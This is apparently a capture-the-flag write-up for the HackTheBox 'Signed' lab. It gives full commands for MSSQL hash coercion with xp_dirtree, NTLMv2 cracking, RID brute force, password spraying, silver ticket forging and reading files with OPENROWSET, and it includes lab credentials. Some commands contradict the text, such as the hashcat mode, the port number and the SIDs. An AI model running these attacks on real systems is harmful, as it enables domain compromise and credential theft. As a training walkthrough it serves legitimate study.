@@ -1,0 +1,213 @@
+Today we're gonna take a look a medium machine of hackthebox, all related to MSSQL misconfiguration, you gonna learn a lot here, as i did recently, we're gonna take a look on misconfiguration exploitation and privilege escalation trought silver ticketing.
+
+
+
+#### Target : 10.10.11.90
+
+As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH
+
+
+Let's start with a simple rustscan, 
+```
+rustscan -a 10.10.11.90 --ulimit  5000
+```
+
+Let's dig in 
+
+```
+╰─ nmap -sT -A -Pn -T5 -p 1443 10.10.11.90 --disable-arp-ping --min-rtt-timeout 50ms --max-rtt-timeout 100ms --stats-every=2s
+```
+
+As output we receive just
+```
+53/dns
+1443/tcp filtered ies-lm
+```
+
+Let's access in MSSQL with the given password
+
+
+#### Netexec
+`nxc mssql 10.10.11.90 -u 'scott' -p 'Sm230#C5NatH' --local-auth `
+
+We have access, so we try to enum databases
+```
+nxc mssql 10.10.11.90 -u 'scott' -p 'Sm230#C5NatH' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+```
+
+![[Pasted image 20251013165052.png]]
+So we access trought MSSQL-client
+╰─ mssqlclient.py signed.htb/scott@10.10.11.90
+
+Since there are just default databases, we attempt to make a relay attack using xp_dirtree to try steal NTLMv2 hashes
+
+`SQL (scott  guest@master)> EXEC xp_dirtree '\\IP\testshare'`
+
+![[Pasted image 20251013091033.png]]
+
+We search on hashcat wiki which module should we use and end up with finding **5600**
+
+### NTLMv2 hash cracking
+`hashcat -a 0 -m 0 hash.txt /usr/share/wordlist/rockyou.txt`
+
+![[Pasted image 20251013091203.png]]
+Password cracked!
+`mssqlsvc  :  purPLE9795!@`
+
+We can join with this user but we don't see anything interesting, so we attempt to get a list of users using rid bruteforce in netexec
+`nxc mssql 10.10.11.90 -u 'scott' -p 'Sm230#C5NatH' --local-auth --rid-brute
+`
+
+```
+DC01\scott:Sm230#C5NatH  
+SIGNED\Enterprise  
+SIGNED\Administrator  
+SIGNED\Guest  
+SIGNED\krbtgt  
+SIGNED\Domain  
+SIGNED\Domain  
+SIGNED\Domain  
+SIGNED\Domain  
+SIGNED\Domain  
+SIGNED\Cert  
+SIGNED\Schema  
+SIGNED\Enterprise  
+SIGNED\Group  
+SIGNED\Read-only  
+SIGNED\Cloneable  
+SIGNED\Protected  
+SIGNED\Key  
+SIGNED\Enterprise  
+SIGNED\RAS  
+SIGNED\Allowed  
+SIGNED\Denied  
+SIGNED\DC01$  
+SIGNED\DnsAdmins  
+SIGNED\DnsUpdateProxy  
+SIGNED\mssqlsvc  
+SIGNED\HR  
+SIGNED\IT  
+SIGNED\Finance  
+SIGNED\Developers  
+SIGNED\Support  
+SIGNED\oliver.mills  
+SIGNED\emma.clark  
+SIGNED\liam.wright  
+SIGNED\noah.adams  
+SIGNED\ava.morris  
+SIGNED\sophia.turner  
+SIGNED\james.morgan  
+SIGNED\mia.cooper  
+SIGNED\elijah.brooks  
+SIGNED\isabella.evans  
+SIGNED\lucas.murphy  
+SIGNED\william.johnson  
+SIGNED\charlotte.price  
+SIGNED\henry.bennett  
+SIGNED\amelia.kelly  
+SIGNED\jackson.gray  
+SIGNED\harper.diaz  
+SIGNED\SQLServer2005SQLBrowserUser$DC01
+```
+
+##### Password spraying
+	╰─ nxc mssql 10.10.11.90 -u final_list.txt  -p 'purPLE9795!@' --local-auth
+
+```
+MSSQL       10.10.11.90     1433   DC01            
+[+] SIGNED.HTB\mssqlsvc:purPLE9795!@
+```
+
+from MSSQL we can see that IT is a admin group
+
+We can attempt to forge a silver ticket 
+
+https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/silver-ticket-attack/
+
+Requirements:
+```
+python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
+
+export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
+
+python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
+```
+
+So we need: 
+1. NT HASH
+2. Domain SID
+3. SPN
+
+Since we already have the mssqlsvc cracked password, we can convert it to a NT hash with https://www.browserling.com/tools/ntlm-hash , then we need the sid: We can get the binary SID from MSSQL
+```
+SELECT SUSER_SID('SIGNED\mssqlsvc') AS SidBinary;
+```
+	b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
+
+As we just get  the binary SID, we must convert it in a SID, for this we can use this script
+
+```
+
+import struct
+
+hex_sid = "0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000"
+
+sid_bytes = bytes.fromhex(hex_sid)
+
+revision = sid_bytes[0]
+sub_auth_count = sid_bytes[1]
+identifier_authority = int.from_bytes(sid_bytes[2:8], byteorder='big')
+
+sid_string = f"S-{revision}-{identifier_authority}"
+
+offset = 8
+for i in range(sub_auth_count):
+    sub_auth = struct.unpack('<I', sid_bytes[offset:offset+4])[0]
+    sid_string += f"-{sub_auth}"
+    offset += 4
+
+print("SID:", sid_string)
+```
+
+SID: S-1-5-21-4088429403-1159899800-2753317549-1105
+(Remember to remove the group RID) 1105
+
+SID: S-1-5-21-4088429403-1159899800-2753317549
+
+as SPN we can use MSSQLSvc/DC01.SIGNED.HTB
+
+then we need the Administrator SID (same process)
+
+```
+SELECT SUSER_SID('SIGNED\Administrator') AS SidBinary;
+
+b'0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000'
+
+SID: S-1-5-21-4088429403-1159899800-2753317549-500
+```
+
+(Since IT is a group tho, we need to specify the RID and user id, in this case, 512 is for admin group,1105 is for the user (Grabbed from the SID of mssqlsvc))
+
+`ticketer.py -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain-sid "S-1-5-21-4088429403-1159899800-2753317549" -domain signed.htb -spn MSSQLSvc/DC01.SIGNED.HTB -groups 512,1105 -user-id 1103 "Administrator"`
+
+now we can export it :
+`export KRB5CCNAME=$pwd/Administrator.ccache`
+
+Verify that the ticket is signed correctly
+`klist`
+And then sign in using the ticket:
+`╰─ mssqlclient.py signed.htb/Administrator@dc01.signed.htb -windows-auth -k -no-pass
+`
+
+Now we are admin in the service MSSQL, but as we'll use XP_CMDSHELL to exec remote comand, it drops the impersonated SPN, meaning that we will return back to mssqlsvc, but with more privileges,
+For this we can use a MSSQL feature called OPENROWSET
+https://learn.microsoft.com/it-it/sql/t-sql/functions/openrowset-transact-sql?view=sql-server-ver17
+
+```
+SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents
+
+SELECT * FROM OPENROWSET(BULK N'C:\Users\mssqlvc\Desktop\user.txt', SINGLE_CLOB) AS Contents
+```
+
+
+As result we get the flag and we pwn the machine.
